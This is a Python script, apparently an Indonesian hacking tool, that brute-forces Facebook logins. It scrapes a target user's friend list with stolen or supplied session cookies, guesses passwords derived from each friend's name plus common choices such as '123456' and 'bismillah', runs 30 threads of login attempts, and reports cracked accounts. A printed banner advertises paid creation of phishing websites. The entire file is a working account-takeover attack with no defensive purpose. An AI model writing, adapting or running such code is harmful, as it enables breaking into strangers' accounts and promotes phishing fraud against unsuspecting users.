from fb import *

def brute_force(email, pw):
    ses = requests.Session()
    global acc
    for password in pw:
        try:
            req = ses.get(url, headers = headers(userAgent()))
            lsd = sort_payload(req.text, "lsd")
            jazoest = sort_payload(req.text, "jazoest")
            li = sort_payload(req.text, "li")
            m_ts = sort_payload(req.text, "m_ts")
            payload = payloads(lsd, jazoest, m_ts, li, email, password)
            post = ses.post(url_login, headers=headers_login(userAgent()), data=payload, allow_redirects=False)
            cook = ses.cookies.get_dict()
            if ("c_user" in str(cook)):
                print(f"#=> {Fore.GREEN}{email}{Fore.RESET} | {Fore.GREEN}{password}{Fore.RESET} => {Fore.GREEN}OK{Fore.RESET}")
                break
            elif ("checkpoint" in str(cook)):
                print(f"#=> {Fore.YELLOW}{email}{Fore.RESET} | {Fore.YELLOW}{password}{Fore.RESET} => {Fore.YELLOW}CP{FORE.RESET}")
                break
            else:
                continue
        except Exception as e:
            continue

def menu():
    cookies = cookies_checker("./assets/cookies.txt")
    try:
        profile = requests.get(f"{url}/profile.php", cookies={"cookie": cookies})
        xid = sort_payload(profile.text, "target")
    except:
        new_cookie = input("?=> Facebook cookies: ")
        login_cookies(new_cookie)
    print(logo)
    try:
        print(f"•=> User Login: {Fore.GREEN}{xid}{Fore.RESET}")
    except:
        print(f"•=> User Login: {Fore.GREEN}None{Fore.RESET}")
    print(f"!=> {Fore.YELLOW}Iklan{Fore.RESET}: {Style.BRIGHT}{Fore.GREEN}Melayani pembuatan berbagai macam tools sosial media, web scrapping, bot automatic dan juga melayani pembuatan bot seprti bot chat facebook, wa, telegram serta jasa pembuatan web seperti web phising, portfolio, dsb sesuai request.. jika berminat silahkan hubungi no wa: +6282382022200{Fore.RESET}\n")
    print("!=> Warning: crack from friendlist!!\n")
    username = input("?=> Username/id: ")
    uf = f"{url}/{username}/friends?_rdr"
    fl = get_friend(uf, cookies)
    print("\n*!=> ============[BRUTE FORCE STARTED]============ <=!*\n")
    with executor(max_workers=30) as ex:
        for account in fl:
            try:
                email,name = account.split("/")
                passoword = name.split(" ")
            except:
                exit("!=> User not found")
            pw = [passoword[0]+"123",passoword[0]+"1234",passoword[0]+"12345",name,"bismillah","123456","sayang"]
            ex.submit(brute_force,(email),(pw))
    print("\n*!=> ============[BRUTE FORCE FINISHED]============ <=!*\n")

if __name__ == '__main__':
    menu()
